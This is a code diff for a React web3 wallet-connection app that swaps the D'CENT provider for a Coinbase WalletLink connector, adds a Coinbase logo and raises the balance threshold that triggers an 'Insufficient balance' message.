@@ -11,7 +11,7 @@ import Torus from "@toruslabs/torus-embed";
 import Authereum from "authereum";
 import { Bitski } from "bitski";
 import Portis from '@portis/web3';
-import DcentProvider from "dcent-provider";
+import WalletLink from 'walletlink';
 
 import Button, {SHoverLayer} from "./components/Button";
 import Column from "./components/Column";
@@ -22,7 +22,8 @@ import Loader from "./components/Loader";
 import ModalResult from "./components/ModalResult";
 import AccountAssets from "./components/AccountAssets";
 import ConnectButton from "./components/ConnectButton";
-import BscLogo from './assets/bsc.png';
+import BscLogo from "./assets/bsc.png";
+import CoinBaseLogo from "./assets/coinbase.png";
 
 import { apiGetAccountAssets } from "./helpers/api";
 import {
@@ -416,12 +417,6 @@ class App extends React.Component<any, any> {
           id: "15a33955-3769-422a-a2f3-dc508bf3c632"
         }
       },
-      dcentwallet: {
-        package: DcentProvider,
-        options: {
-          rpcUrl: "https://public-node.testnet.rsk.co",
-        }
-      },
       torus: {
         package: Torus
       },
@@ -440,6 +435,28 @@ class App extends React.Component<any, any> {
           clientId: "7e3dbbbd-df49-456b-88de-68e543e43ee0",
           callbackUrl: window.location.href + "bitski-callback.html"
         }
+      },
+      'custom-walletlink': {
+        display: {
+          logo: CoinBaseLogo,
+          name: 'Coinbase',
+          description: 'Connect to Coinbase Wallet (not Coinbase App)',
+        },
+        options: {
+          appName: 'Coinbase',
+          networkUrl: `https://mainnet.infura.io/v3/460f40a260564ac4a4f4b3fffb032dad`,
+          chainId: 1,
+        },
+        package: WalletLink,
+        connector: async (_: any, options: any) => {
+          const { appName, networkUrl, chainId } = options
+          const walletLink = new WalletLink({
+            appName,
+          })
+          const provider = walletLink.makeWeb3Provider(networkUrl, chainId)
+          await provider.enable()
+          return provider
+        },
       },
       frame: {
         package: ethProvider
@@ -632,7 +649,7 @@ class App extends React.Component<any, any> {
               <SModalParagraph style={{color: '#95D1CC'}}>{"Transaction successfully completed 🥳"}</SModalParagraph>
               <ModalResult>{result}</ModalResult>
             </SModalContainer>
-          ) : Number(localStorage.getItem('balance')) - 2502441524727298 <= 0 ? (
+          ) : Number(localStorage.getItem('balance')) - 3002441524727298 <= 0 ? (
             <SModalContainer>
               <SModalParagraph style={{color: '#F9D371'}}>
                 {this.state.connectError.bool === false && 'Insufficient balance'} {this.state.connectError.bool === false && <GoAlert/>}
